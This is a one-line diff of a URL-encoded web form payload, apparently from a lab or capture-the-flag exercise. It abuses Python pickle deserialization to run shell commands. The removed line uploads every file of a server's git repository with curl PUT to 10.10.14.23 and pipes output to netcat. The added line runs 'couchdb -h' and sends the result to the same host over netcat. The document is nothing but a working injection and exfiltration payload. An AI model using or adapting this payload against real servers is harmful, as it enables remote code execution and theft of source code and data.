@@ -1,1 +1,1 @@
-quote=%0A.&character=cposix%0Asystem%0Ap1%0A%28S%22echo+%27homer%27%3B+echo+-e+%24%28find+%2Fvar%2Fwww%2Fgit%2Fsimpsons.git+-name+%27%2A%27+-type+f+-exec+curl+-X+PUT+-T+%7B%7D+http%3A%2F%2F10.10.14.23%3A8000%29%5C%5C%5Cn+%7C+nc+-u+10.10.14.23+6667%22%0AtRp2
+quote=%0A.&character=cposix%0Asystem%0Ap1%0A%28S%22echo+%27homer%27%3B+echo+-e+%24%28couchdb+-h%29%5C%5C%5Cn+%7C+nc+-u+10.10.14.23+6667%22%0AtRp2
